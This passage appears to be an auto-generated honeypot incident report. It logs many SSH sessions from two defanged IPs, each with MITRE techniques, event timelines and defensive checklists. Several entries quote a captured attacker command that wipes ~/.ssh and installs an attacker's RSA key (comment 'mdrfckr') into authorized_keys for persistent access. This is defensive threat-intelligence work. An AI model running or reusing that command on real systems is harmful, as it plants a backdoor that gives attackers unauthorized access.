| `2026-05-04 16:16:29` | `cowrie.command.input` |
| `2026-05-04 16:16:29` | `cowrie.command.failed` |
| `2026-05-04 16:16:29` | `cowrie.log.closed` |
| `2026-05-04 16:16:29` | `cowrie.session.params` |
| `2026-05-04 16:16:29` | `cowrie.command.input` |
| `2026-05-04 16:16:29` | `cowrie.session.file_download` |
| `2026-05-04 16:16:29` | `cowrie.log.closed` |
| `2026-05-04 16:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4806785b594

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:16 |
| **Last Seen** | 2026-05-04 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:16:31` | `cowrie.session.connect` |
| `2026-05-04 16:16:31` | `cowrie.client.version` |
| `2026-05-04 16:16:31` | `cowrie.client.kex` |
| `2026-05-04 16:16:31` | `cowrie.login.success` |
| `2026-05-04 16:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07de00b2a41

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:18 |
| **Last Seen** | 2026-05-04 16:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:18:11` | `cowrie.session.connect` |
| `2026-05-04 16:18:11` | `cowrie.client.version` |
| `2026-05-04 16:18:11` | `cowrie.client.kex` |
| `2026-05-04 16:18:13` | `cowrie.login.success` |
| `2026-05-04 16:18:14` | `cowrie.session.params` |
| `2026-05-04 16:18:14` | `cowrie.command.input` |
| `2026-05-04 16:18:14` | `cowrie.command.failed` |
| `2026-05-04 16:18:14` | `cowrie.log.closed` |
| `2026-05-04 16:18:15` | `cowrie.session.params` |
| `2026-05-04 16:18:15` | `cowrie.command.input` |
| `2026-05-04 16:18:15` | `cowrie.session.file_download` |
| `2026-05-04 16:18:15` | `cowrie.log.closed` |
| `2026-05-04 16:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9dd670b5a5

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:18 |
| **Last Seen** | 2026-05-04 16:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:18:19` | `cowrie.session.connect` |
| `2026-05-04 16:18:19` | `cowrie.client.version` |
| `2026-05-04 16:18:19` | `cowrie.client.kex` |
| `2026-05-04 16:18:21` | `cowrie.login.success` |
| `2026-05-04 16:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42ac305a7c7

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:19 |
| **Last Seen** | 2026-05-04 16:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:19:18` | `cowrie.session.connect` |
| `2026-05-04 16:19:18` | `cowrie.client.version` |
| `2026-05-04 16:19:19` | `cowrie.client.kex` |
| `2026-05-04 16:19:20` | `cowrie.login.success` |
| `2026-05-04 16:19:20` | `cowrie.session.params` |
| `2026-05-04 16:19:20` | `cowrie.command.input` |
| `2026-05-04 16:19:20` | `cowrie.command.failed` |
| `2026-05-04 16:19:21` | `cowrie.log.closed` |
| `2026-05-04 16:19:21` | `cowrie.session.params` |
| `2026-05-04 16:19:21` | `cowrie.command.input` |
| `2026-05-04 16:19:21` | `cowrie.session.file_download` |
| `2026-05-04 16:19:21` | `cowrie.log.closed` |
| `2026-05-04 16:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e191e75404

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:19 |
| **Last Seen** | 2026-05-04 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:19:25` | `cowrie.session.connect` |
| `2026-05-04 16:19:25` | `cowrie.client.version` |
| `2026-05-04 16:19:25` | `cowrie.client.kex` |
| `2026-05-04 16:19:27` | `cowrie.login.success` |
| `2026-05-04 16:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07ed0d775d3

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:20 |
| **Last Seen** | 2026-05-04 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:20:22` | `cowrie.session.connect` |
| `2026-05-04 16:20:22` | `cowrie.client.version` |
| `2026-05-04 16:20:22` | `cowrie.client.kex` |
| `2026-05-04 16:20:24` | `cowrie.login.success` |
| `2026-05-04 16:20:24` | `cowrie.session.params` |
| `2026-05-04 16:20:24` | `cowrie.command.input` |
| `2026-05-04 16:20:24` | `cowrie.command.failed` |
| `2026-05-04 16:20:25` | `cowrie.log.closed` |
| `2026-05-04 16:20:25` | `cowrie.session.params` |
| `2026-05-04 16:20:25` | `cowrie.command.input` |
| `2026-05-04 16:20:26` | `cowrie.session.file_download` |
| `2026-05-04 16:20:26` | `cowrie.log.closed` |
| `2026-05-04 16:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbe95708cdf5

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:20 |
| **Last Seen** | 2026-05-04 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:20:29` | `cowrie.session.connect` |
| `2026-05-04 16:20:29` | `cowrie.client.version` |
| `2026-05-04 16:20:30` | `cowrie.client.kex` |
| `2026-05-04 16:20:31` | `cowrie.login.success` |
| `2026-05-04 16:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daaa1eb388d2

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:21 |
| **Last Seen** | 2026-05-04 16:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:21:25` | `cowrie.session.connect` |
| `2026-05-04 16:21:25` | `cowrie.client.version` |
| `2026-05-04 16:21:25` | `cowrie.client.kex` |
| `2026-05-04 16:21:27` | `cowrie.login.success` |
| `2026-05-04 16:21:28` | `cowrie.session.params` |
| `2026-05-04 16:21:28` | `cowrie.command.input` |
| `2026-05-04 16:21:28` | `cowrie.command.failed` |
| `2026-05-04 16:21:28` | `cowrie.log.closed` |
| `2026-05-04 16:21:29` | `cowrie.session.params` |
| `2026-05-04 16:21:29` | `cowrie.command.input` |
| `2026-05-04 16:21:30` | `cowrie.session.file_download` |
| `2026-05-04 16:21:30` | `cowrie.log.closed` |
| `2026-05-04 16:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82ee42279a79

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:21 |
| **Last Seen** | 2026-05-04 16:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:21:34` | `cowrie.session.connect` |
| `2026-05-04 16:21:34` | `cowrie.client.version` |
| `2026-05-04 16:21:35` | `cowrie.client.kex` |
| `2026-05-04 16:21:36` | `cowrie.login.success` |
| `2026-05-04 16:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2d68d3d779

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:22 |
| **Last Seen** | 2026-05-04 16:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:22:30` | `cowrie.session.connect` |
| `2026-05-04 16:22:30` | `cowrie.client.version` |
| `2026-05-04 16:22:30` | `cowrie.client.kex` |
| `2026-05-04 16:22:31` | `cowrie.login.success` |
| `2026-05-04 16:22:32` | `cowrie.session.params` |
| `2026-05-04 16:22:32` | `cowrie.command.input` |
| `2026-05-04 16:22:32` | `cowrie.command.failed` |
| `2026-05-04 16:22:32` | `cowrie.log.closed` |
| `2026-05-04 16:22:33` | `cowrie.session.params` |
| `2026-05-04 16:22:33` | `cowrie.command.input` |
| `2026-05-04 16:22:33` | `cowrie.session.file_download` |
| `2026-05-04 16:22:33` | `cowrie.log.closed` |
| `2026-05-04 16:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9e0f9c752b

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:22 |
| **Last Seen** | 2026-05-04 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:22:37` | `cowrie.session.connect` |
| `2026-05-04 16:22:37` | `cowrie.client.version` |
| `2026-05-04 16:22:37` | `cowrie.client.kex` |
| `2026-05-04 16:22:38` | `cowrie.login.success` |
| `2026-05-04 16:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083089f5bcc8

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:23 |
| **Last Seen** | 2026-05-04 16:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:23:31` | `cowrie.session.connect` |
| `2026-05-04 16:23:31` | `cowrie.client.version` |
| `2026-05-04 16:23:32` | `cowrie.client.kex` |
| `2026-05-04 16:23:33` | `cowrie.login.success` |
| `2026-05-04 16:23:34` | `cowrie.session.params` |
| `2026-05-04 16:23:34` | `cowrie.command.input` |
| `2026-05-04 16:23:34` | `cowrie.command.failed` |
| `2026-05-04 16:23:34` | `cowrie.log.closed` |
| `2026-05-04 16:23:34` | `cowrie.session.params` |
| `2026-05-04 16:23:34` | `cowrie.command.input` |
| `2026-05-04 16:23:35` | `cowrie.session.file_download` |
| `2026-05-04 16:23:35` | `cowrie.log.closed` |
| `2026-05-04 16:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571439655399

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:23 |
| **Last Seen** | 2026-05-04 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:23:38` | `cowrie.session.connect` |
| `2026-05-04 16:23:38` | `cowrie.client.version` |
| `2026-05-04 16:23:39` | `cowrie.client.kex` |
| `2026-05-04 16:23:40` | `cowrie.login.success` |
| `2026-05-04 16:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d23fe677d63

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:24 |
| **Last Seen** | 2026-05-04 16:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:24:37` | `cowrie.session.connect` |
| `2026-05-04 16:24:37` | `cowrie.client.version` |
| `2026-05-04 16:24:38` | `cowrie.client.kex` |
| `2026-05-04 16:24:39` | `cowrie.login.success` |
| `2026-05-04 16:24:41` | `cowrie.session.params` |
| `2026-05-04 16:24:41` | `cowrie.command.input` |
| `2026-05-04 16:24:41` | `cowrie.command.failed` |
| `2026-05-04 16:24:41` | `cowrie.log.closed` |
| `2026-05-04 16:24:42` | `cowrie.session.params` |
| `2026-05-04 16:24:42` | `cowrie.command.input` |
| `2026-05-04 16:24:42` | `cowrie.session.file_download` |
| `2026-05-04 16:24:42` | `cowrie.log.closed` |
| `2026-05-04 16:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6673e1acbb2e

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:24 |
| **Last Seen** | 2026-05-04 16:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:24:47` | `cowrie.session.connect` |
| `2026-05-04 16:24:47` | `cowrie.client.version` |
| `2026-05-04 16:24:47` | `cowrie.client.kex` |
| `2026-05-04 16:24:49` | `cowrie.login.success` |
| `2026-05-04 16:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f424e856d3

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:25 |
| **Last Seen** | 2026-05-04 16:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:25:50` | `cowrie.session.connect` |
| `2026-05-04 16:25:50` | `cowrie.client.version` |
| `2026-05-04 16:25:50` | `cowrie.client.kex` |
| `2026-05-04 16:25:51` | `cowrie.login.success` |
| `2026-05-04 16:25:52` | `cowrie.session.params` |
| `2026-05-04 16:25:52` | `cowrie.command.input` |
| `2026-05-04 16:25:52` | `cowrie.command.failed` |
| `2026-05-04 16:25:52` | `cowrie.log.closed` |
| `2026-05-04 16:25:53` | `cowrie.session.params` |
| `2026-05-04 16:25:53` | `cowrie.command.input` |
| `2026-05-04 16:25:53` | `cowrie.session.file_download` |
| `2026-05-04 16:25:53` | `cowrie.log.closed` |
| `2026-05-04 16:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9b6e5023ecb

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:25 |
| **Last Seen** | 2026-05-04 16:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:25:58` | `cowrie.session.connect` |
| `2026-05-04 16:25:58` | `cowrie.client.version` |
| `2026-05-04 16:25:58` | `cowrie.client.kex` |
| `2026-05-04 16:26:00` | `cowrie.login.success` |
| `2026-05-04 16:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

